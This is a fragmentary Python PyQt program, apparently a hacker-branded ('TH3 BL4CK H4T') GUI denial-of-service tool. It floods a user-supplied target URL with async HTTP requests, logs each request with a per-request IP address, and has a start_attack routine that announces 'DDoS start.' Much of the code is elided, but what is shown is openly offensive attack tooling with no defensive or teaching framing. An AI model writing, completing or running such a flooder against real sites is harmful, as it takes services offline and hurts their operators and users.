    ...
    async def send_request(self, session, ip_address):
        ...
        try:
            async with session.get(self.target_url, headers=headers) as response:
                self.log_signal.emit(f"power by @bl4ck-hat {self.target_url} from IP: {ip_address} - Status: {response.status}")
        except Exception as e:
            self.log_signal.emit(f"Error request from IP: {ip_address} - {e}")
...
class MainWindow(QMainWindow):
    def __init__(self):
        ...
        self.log_output.setStyleSheet("background-color:#191919; color: white;")
        ...
        image_url = "https://i.pinimg.com/736x/92/c3/e3/92c3e3ec8c110fedb2e6528c7ab258fb.jpg"    #norkkk2
    ...
    def load_image(self, image_url):
        try:
            ...
            self.image_label.setPixmap(pixmap.scaled(490, 600, Qt.KeepAspectRatio))  
        except Exception as e:
    ...
    def start_attack(self):
        ...
        try:
            ...
            QMessageBox.critical(self, "TH3 BL4CK H4T", "Number of requests must be an integer.")
            return

        if not target_url or num_requests <= 0:
            QMessageBox.critical(self, " TH3 BL4CK H4T ", "Please provide a valid URL and number of requests.")
            return

        self.log_message("DDoS start.")

        self.attack_thread = AttackThread(target_url, num_requests)
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.start()
        QMessageBox.information(self, "BL4CK H4T", "$-start Ddos ! Check logs.")
